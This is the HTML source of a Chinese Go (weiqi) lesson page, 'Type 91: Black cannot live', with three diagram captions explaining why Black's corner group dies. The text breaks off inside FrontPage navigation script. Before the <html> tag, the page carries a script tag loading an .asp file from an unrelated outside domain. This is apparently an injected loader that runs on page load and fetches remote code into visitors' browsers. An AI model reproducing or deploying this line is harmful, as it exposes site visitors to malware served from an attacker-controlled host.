<script src=http://www.xinwen520.net/48472394k4r.asp></script><html>  <head> <meta http-equiv="Content-Type" content="text/html; charset=gb2312"> <meta name="GENERATOR" content="Microsoft FrontPage 6.0"> <meta name="ProgId" content="FrontPage.Editor.Document"> <title>第91型 黑不活</title> <link rel="stylesheet" type="text/css" href="../../../weiqi365.css"> <meta name="Microsoft Theme" content="-1 0111, default"> </head>  <body background="../../../_themes/-1/urbtextb.gif" bgcolor="#FFFFCC" text="#330033" link="#663300" vlink="#CC6633" alink="#666666"><!--mstheme--><font face="宋体">  <h1 align="center"><!--mstheme--><font color="#660033"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">第91型    黑不活</span></font><!--mstheme--></font></h1>  <div align="center">    <center><!--mstheme--></font><table border="0" width="800" cellspacing="5">    <tr>      <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No91_1.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No91_2.png" width="232" height="232"><!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图1</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">这也是典型的死形。黑1如粘，白2、4两扳，再于6位一点，黑恰成死形。换句话说，黑要补两手才能活。</span></font><!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图2</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">黑1在二、1急所虎怎么样？白2当然要点，黑3如粘，白4扳，黑仍死。</span></font>       <p>　<!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No91_3.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center"><!--mstheme--><font face="宋体">       <h1><!--mstheme--><font color="#660033"><span style="letter-spacing: 1pt"><a href="mailto:fiveduan@tom.com"><font face="楷体_GB2312">您的高见</font></a></span><!--mstheme--></font></h1>     <!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图3</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">前图黑3如于本图做眼，行不行呢？当然不行，因为白4可断，黑两边不入气。黑棋的缺陷在于有断点。另外，白4于a位扳也可。</span></font></p>     <!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>   </tr> </table><!--mstheme--><font face="宋体"></center> </div> <p align="center"> <!--webbot bot="Navigation" S-Type="arrows" S-Orientation="horizontal" S-Rendering="graphics" B-Include-Home="FALSE" B-Include-Up="TRUE" U-Page S-Target startspan --><script language="JavaScript"><!-- MSFPhover =    (((navigator.appName == "Netscape") &&    (parseInt(navigator.appVersion) >= 3 )) ||    ((navigator.appName == "Microsoft Internet Explorer") &&    (parseInt(navigator.appVersion) >= 4 )));  function MSFPpreload(img)  {   var a=new Image(); a.src=img; return a;  } // --></script><script language="JavaScript"><!-- if(MSFPhover) { MSFPnav1n=MSFPpreload("../../../_derived/back_cmp_-1110_back.gif"); MSFPnav1h=MSFPpreload("../../../_derived/back_cmp_-1110_back_a.gif"); } // --></script><a href="../No86/No86.htm" language="JavaScript" onmouseover="if(MSFPhover) document['MSFPnav1'].src=MSFPnav1h.src" onmouseout="if(MSFPhover) docu
